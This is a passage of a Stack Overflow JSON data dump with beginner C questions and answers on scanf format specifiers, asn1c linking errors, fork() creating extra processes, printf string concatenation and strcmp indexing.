\u2018input\u2019:\nsource_file.c:8:2: warning: format \u2018%d\u2019 expects argument of type \u2018int *\u2019, but argument 2 has type \u2018float *\u2019 [-Wformat=]\n  scanf(\"%d\", &amp;N);\n  ^\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "is_accepted": false, "score": -1, "last_activity_date": 1447259348, "creation_date": 1447259348, "answer_id": 33655149, "question_id": 33654568, "link": "https://stackoverflow.com/questions/33654568/why-is-my-program-not-properly-working-for-c/33655149#33655149", "title": "Why is my program not properly working for C?", "body": "<pre><code>int input (float *xPtr, float R[max],float N){\n    int i;\n    printf(\"Please enter how many resistors you want in series:   \");\n    scanf(\"%f\", &amp;N);\n    //      ^___________ use \"%f\" for float\n    for(i=0; i&lt;N; i++){\n        printf(\"Enter the value of R%d:    \", i+1);\n        scanf(\"%f\", R+i);\n    }\n    for(i=0; i&lt;N; i++){\n        printf(\"R[%d]=%.2f\\n\", i+1, *(xPtr+i));\n    }\n    equivRseries(R, N, xPtr);\n    return N;\n}\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 5551302, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/1214556038558296/picture?type=large", "display_name": "Augusto Celis", "link": "https://stackoverflow.com/users/5551302/augusto-celis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "closed_date": 1447270183, "answer_count": 2, "score": -4, "last_activity_date": 1447259348, "creation_date": 1447257586, "last_edit_date": 1447257788, "question_id": 33654568, "link": "https://stackoverflow.com/questions/33654568/why-is-my-program-not-properly-working-for-c", "closed_reason": "Needs details or clarity", "title": "Why is my program not properly working for C?", "body": "<p>My program is supposed to display in an array how is R1=x, R2=x, R3=x. Then it is supposed to calculate the equivalent resistance of the resistors in series. All the values are user supplied. My problem is that I don't think it passes the function over properly to equivRseries. On the output, it lets me put in the amount of resistors, but once I put in a value for resistance, it won't let me enter the value of the rest of the resistors. Can I please get some help with this? Here is my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n#define max 100\n\nvoid equivRseries(float R[max], float N, float *xPtr);\nvoid input (float *xPtr, float R[max], float N){\n    int i;\n    printf(\"Please enter how many resistors you want in series:   \");\n    scanf(\"%d\", &amp;N);\n    for(i=0; i&lt;N; i++){\n        printf(\"Enter the value of R%d:    \", i+1);\n        scanf(\"%f\", &amp;R[i]);\n    }\n    for(i=0; i&lt;N; i++){\n        printf(\"R[%d]=%.2f\\n\", i+1, *(xPtr+i));\n    }\n    equivRseries(R, N, xPtr);\n}\n\nvoid equivRseries(float R[max], float N, float *xPtr){\n    int i;\n    float equivR=0;\n    for(i=0; i&lt;N; i++){\n        equivR=equivR+*(xPtr+i);\n    }\n    printf(\"Equivalent resistance of this circuit is %f\\n\", equivR);\n}\n\nint main(){\n    float R[max], series, N;\n    float *xPtr;\n    xPtr=R;\n    input(xPtr,R,N);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c++", "c", "linux", "eclipse", "asn.1"], "comments": [{"owner": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "edited": false, "score": 0, "creation_date": 1447271997, "post_id": 33654354, "comment_id": 55091171, "body": "The linker command <code>g++  -o &quot;ASN1&quot;  .&#47;src&#47;ASN1.o</code> means that the auto-generated <code>c</code> files were not added to the project. I don&#39;t know Eclipse, but apparently just adding path is not enough."}, {"owner": {"reputation": 161, "user_id": 5551037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47810e6892a55123face3fc3f75a37fb?s=128&d=identicon&r=PG&f=1", "display_name": "SBond", "link": "https://stackoverflow.com/users/5551037/sbond"}, "reply_to_user": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "edited": false, "score": 0, "creation_date": 1447289621, "post_id": 33654354, "comment_id": 55098747, "body": "...I get the same error withouteclipse :(   (see Edit 1)"}, {"owner": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "edited": false, "score": 0, "creation_date": 1447289677, "post_id": 33654354, "comment_id": 55098766, "body": "Show the non-eclipse command line. Does it list all the <code>.c</code> files generated by asn1?"}, {"owner": {"reputation": 161, "user_id": 5551037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47810e6892a55123face3fc3f75a37fb?s=128&d=identicon&r=PG&f=1", "display_name": "SBond", "link": "https://stackoverflow.com/users/5551037/sbond"}, "reply_to_user": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "edited": false, "score": 0, "creation_date": 1447292161, "post_id": 33654354, "comment_id": 55099456, "body": "yes. All files are in the same folder"}, {"owner": {"reputation": 161, "user_id": 5551037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47810e6892a55123face3fc3f75a37fb?s=128&d=identicon&r=PG&f=1", "display_name": "SBond", "link": "https://stackoverflow.com/users/5551037/sbond"}, "reply_to_user": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "edited": false, "score": 0, "creation_date": 1447335519, "post_id": 33654354, "comment_id": 55118145, "body": "Problem solved :D  All .c files must be inside of the workspace. ...a path outside of the workspace, produced errors."}], "owner": {"reputation": 161, "user_id": 5551037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47810e6892a55123face3fc3f75a37fb?s=128&d=identicon&r=PG&f=1", "display_name": "SBond", "link": "https://stackoverflow.com/users/5551037/sbond"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 432, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1447289806, "creation_date": 1447256900, "last_edit_date": 1447289806, "question_id": 33654354, "link": "https://stackoverflow.com/questions/33654354/eclipse-cdt-and-asn1c-undefined-reference-to", "title": "Eclipse CDT and asn1c (undefined reference to ...)", "body": "<p>First of all: my english is poor, but I hope you understand me.\nI develop under Linux (Debian) with Eclipse CDT (C++) and I need ASN.1 for my application. I installed asn1c (from <a href=\"http://lionet.info/\" rel=\"nofollow\">http://lionet.info/</a>) and attempted the example in the documentation, but it always fails.</p>\n\n<p>I did the following:</p>\n\n<p>I extracted and installed asn1c with follows commands in the terminal (as root):</p>\n\n<pre><code>tar xfz asn1c-0.9.27.tar.gz\ncd asn1c-0.9.27\n./configure\nmake\nmake install\n</code></pre>\n\n<p>After this, I could use asn1c in the terminal. Now I tried the example in the documentation (asn1c-usage.pdf). I created a file named rectangle.asn1 with the following contents:</p>\n\n<pre><code>RectangleModule1 DEFINITIONS ::= BEGIN\n   Rectangle ::= SEQUENCE {\n   height INTEGER,\n   width INTEGER\n}\nEND\n</code></pre>\n\n<p>After this, I compiled it in the terminal with follow command:</p>\n\n<pre><code>asn1c rectangle.asn1\n</code></pre>\n\n<p>Ok, it works without a warning and I get many .c and .h files. Now I created a new c++ project in eclipse and add the path to the compiled asn1 files. Then I wrote the main.cpp file with the following code:</p>\n\n<pre><code>#include &lt;Rectangle.h&gt;\n\nint main() \n{\n    Rectangle_t *rect = NULL;\n    asn_DEF_Rectangle.free_struct(&amp;asn_DEF_Rectangle, rect, 0);\n\n    /* more code   \u2026some time */\n\n    return 0;\n}\n</code></pre>\n\n<p>However, I can\u2019t compile this code. I always get an error like this: undefined reference to 'asn_DEF_Rectangle'</p>\n\n<p>Eclipse output:</p>\n\n<pre><code>make all \nBuilding file: ../src/ASN1.cpp\nInvoking: GCC C++ Compiler\ng++ -I/root/Dokumente -O0 -g3 -Wall -c -fmessage-length=0 -MMD -MP -MF\"src/ASN1.d\" -MT\"src/ASN1.d\" -o \"src/ASN1.o\" \"../src/ASN1.cpp\"\nFinished building: ../src/ASN1.cpp\n\nBuilding target: ASN1\nInvoking: GCC C++ Linker\ng++  -o \"ASN1\"  ./src/ASN1.o   \nmakefile:45: recipe for target 'ASN1' failed\n./src/ASN1.o: In function `main':\n/media/sf_NTS_Daten/Workspace/ASN1/Debug/../src/ASN1.cpp:6: undefined reference to `asn_DEF_Rectangle'\n/media/sf_NTS_Daten/Workspace/ASN1/Debug/../src/ASN1.cpp:6: undefined reference to `asn_DEF_Rectangle'\ncollect2: error: ld returned 1 exit status\nmake: *** [ASN1] Error 1\n</code></pre>\n\n<p>All examples I found (documentation and lionet.info) ends with an error (undefined reference to 'asn_DEF_xxxxxxxxxxxxxx'). I don\u2019t know the reason. The structures are working and I can fill it with values, but asn_DEF_Rectangle (in this case) generate an error. I have no idea what I can do. Did I need a library? ...I think the Linker need something... </p>\n\n<p>Have someone tips or ideas? please...\nI do not know how to continue\u2026. :(</p>\n\n<p>...by the way: I use the gcc compiler (eclipse cdt standard)</p>\n\n<p>regards,\nSBond</p>\n\n<p>=============================================</p>\n\n<h1>Edit 1:</h1>\n\n<p>ok....\nto avoid any problems with Eclipse, I try another way:</p>\n\n<p>-> I open this website: <a href=\"http://lionet.info/asn1c/asn1c.cgi\" rel=\"nofollow\">http://lionet.info/asn1c/asn1c.cgi</a> (online asn1 generator)</p>\n\n<p>-> Then I feed it with my example ASN.1 module:</p>\n\n<pre><code>RectangleModule1 DEFINITIONS ::= BEGIN\n   Rectangle ::= SEQUENCE {\n   height INTEGER,\n   width INTEGER\n}\nEND\n</code></pre>\n\n<p>-> I press the \"Proceed with ASN.1 compilation\" button and download the compressed file \"Fetch compiled C sources (71 Kb .tgz)\"</p>\n\n<p>-> I extract all files in a seperate folder: /root/ASN1_test</p>\n\n<p>-> I create a main.cpp (in /root/ASN1_test) with following code:</p>\n\n<pre><code>#include &lt;Rectangle.h&gt;\n\nint main() \n{\n    Rectangle_t *rect = NULL;\n    asn_DEF_Rectangle.free_struct(&amp;asn_DEF_Rectangle, rect, 0);\n\n    /* more code   \u2026some time */\n\n    return 0;\n}\n</code></pre>\n\n<p>-> Now I want compile it with g++ and try this:</p>\n\n<pre><code>g++ -I/root/ASN1_test -o MyProgram main.cpp\n</code></pre>\n\n<p>but...</p>\n\n<pre><code>/tmp/ccwF42ix.o: In function `main':\nmain.cpp:(.text+0x19): undefined reference to `asn_DEF_Rectangle'\nmain.cpp:(.text+0x26): undefined reference to `asn_DEF_Rectangle'\ncollect2: error: ld returned 1 exit status\nroot@debian:~/ASN1_test#\n</code></pre>\n\n<hr>\n\n<p>What did I wrong? How I can compile this code? :(</p>\n"}, {"tags": ["c", "process", "fork"], "comments": [{"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 1, "creation_date": 1447255293, "post_id": 33653733, "comment_id": 55080708, "body": "Why do you call <code>fork()</code> twice again inside the <code>if</code> statement?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1447255401, "post_id": 33653733, "comment_id": 55080790, "body": "In the child processes, just do what you are supposed to do, then <code>exit()</code>. Or call e.g. <code>execlp()</code> which won&#39;t return (unless there&#39;s an error)."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1447255524, "post_id": 33653733, "comment_id": 55080887, "body": "Also, I really hope the program you show in your question is not this <code>.&#47;loops</code> program you execute, or you will have an endless loop fork-bombing your system."}, {"owner": {"reputation": 117, "user_id": 4398128, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/7ac01123667625009941ad625c72facf?s=128&d=identicon&r=PG&f=1", "display_name": "Jozo", "link": "https://stackoverflow.com/users/4398128/jozo"}, "edited": false, "score": 0, "creation_date": 1447255787, "post_id": 33653733, "comment_id": 55081061, "body": "Sorry, that was just something I was testing .. But the purpose of this exercise is to fork-bomb the system, dont ask me why tho...  Anyways, the &quot;loops&quot; program shall loop endlessly, so how can I solve it, so that the correct amount of processes are created ?"}], "answers": [{"comments": [{"owner": {"reputation": 117, "user_id": 4398128, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/7ac01123667625009941ad625c72facf?s=128&d=identicon&r=PG&f=1", "display_name": "Jozo", "link": "https://stackoverflow.com/users/4398128/jozo"}, "edited": false, "score": 0, "creation_date": 1447255956, "post_id": 33653911, "comment_id": 55081189, "body": "The purpose is not to wait till the child is finished!  I want to have 5 endles loops going on simuntaniously..."}, {"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "reply_to_user": {"reputation": 117, "user_id": 4398128, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/7ac01123667625009941ad625c72facf?s=128&d=identicon&r=PG&f=1", "display_name": "Jozo", "link": "https://stackoverflow.com/users/4398128/jozo"}, "edited": false, "score": 0, "creation_date": 1447256155, "post_id": 33653911, "comment_id": 55081316, "body": "Then, do the endles loops or use <code>execlp</code> as @JoachimPileborg says instead of the exit(0);`"}, {"owner": {"reputation": 117, "user_id": 4398128, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/7ac01123667625009941ad625c72facf?s=128&d=identicon&r=PG&f=1", "display_name": "Jozo", "link": "https://stackoverflow.com/users/4398128/jozo"}, "edited": false, "score": 0, "creation_date": 1447256337, "post_id": 33653911, "comment_id": 55081428, "body": "I do call execlp at the bottom of the code, but you dont understand my problem, too many processes are created...."}], "tags": [], "owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "is_accepted": false, "score": 0, "last_activity_date": 1447255695, "creation_date": 1447255695, "answer_id": 33653911, "question_id": 33653733, "link": "https://stackoverflow.com/questions/33653733/fork-inside-for-loop-too-many-processes-made/33653911#33653911", "title": "Fork inside for-loop, too many processes made", "body": "<p>Just stop creating too many processes.</p>\n\n<ul>\n<li>Don't call <code>fork()</code> unless you want to create another process.</li>\n<li>Exit the child processes created to avoid creating extra processes.</li>\n<li><code>wait</code>ing the child processes to exit is a good practice.</li>\n</ul>\n\n<p>A code with this modification:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;unistd.h&gt;\n\n#define PROGRAM_A \"./loops\"\n\nint main(){\n    int nrOfProcesses = 1;\n    int i;\n    printf(\"How many processes you want to create?\");\n    scanf(\"%d\", &amp;nrOfProcesses);\n    printf(\"You entered: %d\\n\", nrOfProcesses);\n    int processid;\n    for (i=0; i&lt;nrOfProcesses; i++){\n        if((processid = fork()) == 0){\n            printf(\"PROCESS ID: %d\\n\", processid);\n            printf(\"My PID: %d\\n\", (int) getpid());\n            printf(\"Return value: %d\\n\", (int) processid);\n            exit(0); /* exit this (child) process */\n        }\n\n    }\n    while(wait(&amp;i)&gt;=0); /* get rid of the exited processes from the system */\n    scanf(\"%d\", &amp;nrOfProcesses);\n    printf(\"\\nProcesses created!\");\n    execlp(PROGRAM_A,PROGRAM_A,NULL);\n\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 117, "user_id": 4398128, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/7ac01123667625009941ad625c72facf?s=128&d=identicon&r=PG&f=1", "display_name": "Jozo", "link": "https://stackoverflow.com/users/4398128/jozo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 642, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1447256190, "creation_date": 1447255241, "last_edit_date": 1447256190, "question_id": 33653733, "link": "https://stackoverflow.com/questions/33653733/fork-inside-for-loop-too-many-processes-made", "title": "Fork inside for-loop, too many processes made", "body": "<p>Ive run into a problem, im kinda new to ubuntu, and C for that matter, but I dont think this is going to be too hard to solve.</p>\n\n<p>So this is my problem: I ask the user to enter the amount of processes he/she wants to create, and then I create them inside the for-loop, but too many processes are created!</p>\n\n<p>And I know the reason, its because the child will continue executing the for-loop because the arguments for continuing the for-loop is still valid, but I dont know how to solve it.</p>\n\n<p>Here is the code: </p>\n\n<pre><code>    #include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n\n#define PROGRAM_A \"./loops\"\n\nint main(){\nint nrOfProcesses = 1;\nint i;\nprintf(\"How many processes you want to create?\");\nscanf(\"%d\", &amp;nrOfProcesses);\nprintf(\"You entered: %d\\n\", nrOfProcesses);\nint processid;\nfor (i=0; i&lt;nrOfProcesses; i++){\n    if((processid = fork()) == 0){\n        printf(\"PROCESS ID: %d\\n\", processid);\n        pid_t pid = fork();\n        printf(\"My PID: %d\\n\", (int) getpid());\n        printf(\"Return value: %d\\n\", (int) pid);\n    }\n\n}\nscanf(\"%d\", &amp;nrOfProcesses);\nprintf(\"\\nProcesses created!\");\nexeclp(PROGRAM_A,PROGRAM_A,NULL);\n\n\nreturn 0;\n}\n</code></pre>\n\n<p>And this is the outputs;</p>\n\n<pre><code>How many processes you want to create?2\nYou entered: 2\nPROCESS ID: 0\nMy PID: 4289\nReturn value: 4290\nPROCESS ID: 0\nMy PID: 4288\nReturn value: 4291\nMy PID: 4290\nReturn value: 0\nPROCESS ID: 0\nMy PID: 4292\nReturn value: 4293\nMy PID: 4291\nReturn value: 0\nMy PID: 4293\nReturn value: 0\nPROCESS ID: 0\nMy PID: 4294\nReturn value: 4295\nMy PID: 4295\nReturn value: 0\n</code></pre>\n\n<p>For clarification: I want the motherprogram (this) to create x (nrOfProcesses) numbers of processes, and not wait for them, but my program creates 4 processes instead of 2, when entering 2 as nrOfProcesses.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 36413, "user_id": 2301450, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/4xgoZ.png?s=128&g=1", "display_name": "vaultah", "link": "https://stackoverflow.com/users/2301450/vaultah"}, "edited": false, "score": 4, "creation_date": 1447254888, "post_id": 33653579, "comment_id": 55080443, "body": "<i>If this is too simple I will probably delete this post after it is answered.</i> Huh? Don&#39;t do that. <i>Especially</i> if your question is answered."}, {"owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "edited": false, "score": 3, "creation_date": 1447254989, "post_id": 33653579, "comment_id": 55080514, "body": "This isn&#39;t java ;-)."}, {"owner": {"reputation": 6024, "user_id": 2417459, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/QcuXb.png?s=128&g=1", "display_name": "i486", "link": "https://stackoverflow.com/users/2417459/i486"}, "edited": false, "score": 1, "creation_date": 1447255038, "post_id": 33653579, "comment_id": 55080546, "body": "It is faster to find <code>printf</code> examples in Google than posting question here."}, {"owner": {"reputation": 3853, "user_id": 2474248, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/BDsoE.jpg?s=128&g=1", "display_name": "machine_1", "link": "https://stackoverflow.com/users/2474248/machine-1"}, "edited": false, "score": 0, "creation_date": 1447257785, "post_id": 33653579, "comment_id": 55082467, "body": "you can&#39;t delete the post now.It has 2 upvoted answers.you are now prone to downvotes :-)"}], "answers": [{"tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": true, "score": 3, "last_activity_date": 1447255140, "last_edit_date": 1447255140, "creation_date": 1447254932, "answer_id": 33653610, "question_id": 33653579, "link": "https://stackoverflow.com/questions/33653579/whats-wrong-with-my-user-input-in-c/33653610#33653610", "title": "Whats wrong with my user input in C", "body": "<p>There is nothing wrong with <code>scanf()</code>, the issue here is with <code>printf()</code> statement. In C, you need to have a format specifier to print the supplied arguments. Read the <a href=\"http://linux.die.net/man/3/printf\" rel=\"nofollow\">man page</a> of <code>printf()</code> for further information.</p>\n\n<p>In your code,</p>\n\n<pre><code> printf (\"The result is:\" + a_word);\n</code></pre>\n\n<p>should be</p>\n\n<pre><code>printf (\"The result is: %s \\n\" , a_word);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "is_accepted": false, "score": 2, "last_activity_date": 1447255046, "creation_date": 1447255046, "answer_id": 33653650, "question_id": 33653579, "link": "https://stackoverflow.com/questions/33653579/whats-wrong-with-my-user-input-in-c/33653650#33653650", "title": "Whats wrong with my user input in C", "body": "<p>In C, you cannot append strings with <code>+</code>. To append strings, use <code>strcat()</code> or one of the other functions for this purpose. In your concrete example however, you can just do, as Sourav Ghosh already wrote do:</p>\n\n<pre><code>printf(\"The result is: %s \\n\" , a_word);\n</code></pre>\n"}], "owner": {"reputation": 84, "user_id": 5471930, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-rVJ-ppOA3Vk/AAAAAAAAAAI/AAAAAAAAAHE/_Y3Mqdcoqj0/photo.jpg?sz=128", "display_name": "Carton32", "link": "https://stackoverflow.com/users/5471930/carton32"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 0, "accepted_answer_id": 33653610, "answer_count": 2, "score": -2, "last_activity_date": 1448024120, "creation_date": 1447254846, "last_edit_date": 1448024120, "question_id": 33653579, "link": "https://stackoverflow.com/questions/33653579/whats-wrong-with-my-user-input-in-c", "title": "Whats wrong with my user input in C", "body": "<p>I know python decently well, I've been trying to learn C for the past ~4 days. I found this code online edited it a tad bit and now it won't run.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#define MAX_LEN 80\n\nint main (int argc, char *argv[]){\n    char a_word[MAX_LEN];\n    printf (\"Enter some words:\");\n    scanf (\"%s\", a_word);\n    printf (\"The result is:\" + a_word);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "string", "strcmp"], "comments": [{"owner": {"reputation": 11458, "user_id": 3435400, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/61726fe80facc93d76754f0226b49eb9?s=128&d=identicon&r=PG&f=1", "display_name": "alain", "link": "https://stackoverflow.com/users/3435400/alain"}, "edited": false, "score": 1, "creation_date": 1447255196, "post_id": 33653552, "comment_id": 55080641, "body": "Are the words in the arrays null-terminated? (If not, you should use <code>strncmp</code> and <code>strncpy</code>)"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1447255328, "post_id": 33653552, "comment_id": 55080732, "body": "@Finlandia_C Be careful with <code>strncpy</code> as it might not always zero terminate the string."}, {"owner": {"reputation": 10359, "user_id": 1216776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/504692de390dabd9ca22fd716e178993?s=128&d=identicon&r=PG", "display_name": "stark", "link": "https://stackoverflow.com/users/1216776/stark"}, "edited": false, "score": 0, "creation_date": 1447257942, "post_id": 33653552, "comment_id": 55082575, "body": "If the lists are large it would be faster to sort both lists and then make one pass through both looking for matches."}], "answers": [{"comments": [{"owner": {"reputation": 375, "user_id": 4551823, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/851af7dce4f502a930cb9608b3cd02ef?s=128&d=identicon&r=PG&f=1", "display_name": "Finlandia_C", "link": "https://stackoverflow.com/users/4551823/finlandia-c"}, "edited": false, "score": 0, "creation_date": 1447255635, "post_id": 33653703, "comment_id": 55080960, "body": "Same as above, this still prints zero words out."}, {"owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "reply_to_user": {"reputation": 375, "user_id": 4551823, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/851af7dce4f502a930cb9608b3cd02ef?s=128&d=identicon&r=PG&f=1", "display_name": "Finlandia_C", "link": "https://stackoverflow.com/users/4551823/finlandia-c"}, "edited": false, "score": 0, "creation_date": 1447255758, "post_id": 33653703, "comment_id": 55081039, "body": "From the code you posted it is impossible to determine the problem."}], "tags": [], "owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "is_accepted": false, "score": 0, "last_activity_date": 1447255164, "creation_date": 1447255164, "answer_id": 33653703, "question_id": 33653552, "link": "https://stackoverflow.com/questions/33653552/searching-for-equal-strings-using-strcmp/33653703#33653703", "title": "Searching for equal strings using strcmp", "body": "<p>You are using the same index in the comparison for both arrays:</p>\n\n<pre><code>if ((strcmp(equal_length_dictionary[arr], nextword[arr])) == 0) \n</code></pre>\n\n<p>Array equal_length_dictionary should use index <code>dict</code> not <code>arr</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 375, "user_id": 4551823, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/851af7dce4f502a930cb9608b3cd02ef?s=128&d=identicon&r=PG&f=1", "display_name": "Finlandia_C", "link": "https://stackoverflow.com/users/4551823/finlandia-c"}, "edited": false, "score": 0, "creation_date": 1447255482, "post_id": 33653708, "comment_id": 55080848, "body": "This still prints zero words out. I have added that they are all null terminated strings in the main question."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 375, "user_id": 4551823, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/851af7dce4f502a930cb9608b3cd02ef?s=128&d=identicon&r=PG&f=1", "display_name": "Finlandia_C", "link": "https://stackoverflow.com/users/4551823/finlandia-c"}, "edited": false, "score": 1, "creation_date": 1447255663, "post_id": 33653708, "comment_id": 55080979, "body": "@Finlandia_C It might be time to use a debugger, and step through the code line by line to see what happens and what the strings really are. Remember that <code>strcmp</code> is case-sensitive and that white-space in the strings are compared as well (and white-space includes tabs and also the newlines that e.g. <code>fgets</code> include in the strings it reads). Optionally print out both strings inside quotations to check that they are indeed equal."}, {"owner": {"reputation": 375, "user_id": 4551823, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/851af7dce4f502a930cb9608b3cd02ef?s=128&d=identicon&r=PG&f=1", "display_name": "Finlandia_C", "link": "https://stackoverflow.com/users/4551823/finlandia-c"}, "edited": false, "score": 0, "creation_date": 1447255703, "post_id": 33653708, "comment_id": 55081015, "body": "I have used fscanf to read in the strings instead of fgets. Time to learn how to use a debugger I guess!"}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 0, "last_activity_date": 1447255184, "creation_date": 1447255184, "answer_id": 33653708, "question_id": 33653552, "link": "https://stackoverflow.com/questions/33653552/searching-for-equal-strings-using-strcmp/33653708#33653708", "title": "Searching for equal strings using strcmp", "body": "<p>My guess it the comparison;</p>\n\n<pre><code>strcmp(equal_length_dictionary[arr], nextword[arr])\n</code></pre>\n\n<p>You use the same variable <code>arr</code> for both arrays. The first array should be indexed by <code>dict</code> I would guess:</p>\n\n<pre><code>strcmp(equal_length_dictionary[dict], 